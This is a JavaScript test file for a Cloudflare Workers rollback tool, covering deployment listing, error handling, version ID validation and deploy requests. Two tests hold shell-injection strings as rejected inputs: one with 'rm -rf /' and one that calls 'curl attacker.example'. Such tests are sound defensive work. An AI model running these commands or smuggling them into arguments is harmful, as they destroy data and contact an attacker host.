import assert from "node:assert/strict";
import { describe, it } from "node:test";

import {
  assertValidWorkerVersionId,
  deployWorkerVersion,
  getLatestDeploymentVersionId,
  isValidWorkerVersionId,
  isWorkerScriptNotFound,
  listWorkerDeployments,
  runRollbackCli,
} from "./worker-rollback.mjs";

describe("getLatestDeploymentVersionId", () => {
  it("returns the active version from the newest deployment", () => {
    const id = getLatestDeploymentVersionId([
      {
        id: "dep-1",
        versions: [
          { version_id: "v-new", percentage: 100 },
        ],
      },
    ]);
    assert.equal(id, "v-new");
  });

  it("returns null when no deployments exist", () => {
    assert.equal(getLatestDeploymentVersionId([]), null);
  });
});

describe("isWorkerScriptNotFound", () => {
  it("does not treat a bare HTTP 404 as script not found", () => {
    assert.equal(
      isWorkerScriptNotFound({ status: 404, statusText: "Not Found" }, { success: false }),
      false,
    );
  });

  it("detects script not found message", () => {
    assert.equal(
      isWorkerScriptNotFound(
        { status: 400, statusText: "Bad Request" },
        { success: false, errors: [{ message: "Script not found" }] },
      ),
      true,
    );
  });
});

describe("listWorkerDeployments", () => {
  it("parses a successful API response", async () => {
    const fetchImpl = async () => ({
      ok: true,
      json: async () => ({
        success: true,
        result: { deployments: [{ id: "dep-1", versions: [{ version_id: "abc", percentage: 100 }] }] },
      }),
    });
    const result = await listWorkerDeployments("acct", "worker", "token", { fetchImpl });
    assert.equal(result.length, 1);
    assert.equal(result[0].id, "dep-1");
  });

  it("rejects the old flat result shape instead of reading deployments from it", async () => {
    const fetchImpl = async () => ({
      ok: true,
      json: async () => ({
        success: true,
        result: [{ id: "dep-1", versions: [{ version_id: "abc", percentage: 100 }] }],
      }),
    });
    await assert.rejects(
      listWorkerDeployments("acct", "worker", "token", { fetchImpl }),
      /missing result\.deployments/,
    );
  });

  it("returns an empty list when the Worker script does not exist yet", async () => {
    const fetchImpl = async () => ({
      ok: false,
      status: 404,
      statusText: "Not Found",
      json: async () => ({
        success: false,
        errors: [{ message: "Script not found", code: 10007 }],
      }),
    });
    const result = await listWorkerDeployments("acct", "new-worker", "token", { fetchImpl });
    assert.deepEqual(result, []);
  });

  it("throws on non-not-found API errors", async () => {
    const fetchImpl = async () => ({
      ok: false,
      status: 403,
      statusText: "Forbidden",
      json: async () => ({
        success: false,
        errors: [{ message: "Authentication error" }],
      }),
    });
    await assert.rejects(
      () => listWorkerDeployments("acct", "worker", "token", { fetchImpl }),
      /List deployments failed: Authentication error/,
    );
  });

  it("throws on HTTP 404 without a script-not-found signal", async () => {
    const fetchImpl = async () => ({
      ok: false,
      status: 404,
      statusText: "Not Found",
      json: async () => ({
        success: false,
        errors: [{ message: "Account not found" }],
      }),
    });
    await assert.rejects(
      () => listWorkerDeployments("acct", "worker", "token", { fetchImpl }),
      /List deployments failed: Account not found/,
    );
  });
});

describe("assertValidWorkerVersionId", () => {
  it("accepts a Cloudflare Workers version UUID", () => {
    const id = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
    assert.equal(isValidWorkerVersionId(id), true);
    assert.equal(assertValidWorkerVersionId(id), id);
  });

  it("rejects shell injection in the version argument", () => {
    const injection = '$(rm -rf /); echo pwned';
    assert.equal(isValidWorkerVersionId(injection), false);
    assert.throws(
      () => assertValidWorkerVersionId(injection),
      /Invalid Worker version ID/,
    );
  });
});

describe("runRollbackCli", () => {
  it("returns 1 without calling the API when the version ID is invalid", async () => {
    const fetchImpl = async () => {
      throw new Error("fetch must not be called for invalid version IDs");
    };
    const code = await runRollbackCli(['evil"; curl attacker.example; echo "'], {
      accountId: "acct",
      apiToken: "token",
      scriptName: "worker",
      fetchImpl,
    });
    assert.equal(code, 1);
  });
});

describe("deployWorkerVersion", () => {
  it("posts a 100% deployment for the given version", async () => {
    /** @type {RequestInit | undefined} */
    let capturedInit;
    const fetchImpl = async (_url, init) => {
      capturedInit = init;
      return {
        ok: true,
        json: async () => ({ success: true, result: { id: "dep-2" } }),
      };
    };
    await deployWorkerVersion("acct", "worker", "version-1", "token", { fetchImpl });
    assert.equal(capturedInit?.method, "POST");
    const body = JSON.parse(String(capturedInit?.body));
    assert.deepEqual(body.versions, [{ version_id: "version-1", percentage: 100 }]);
  });
});
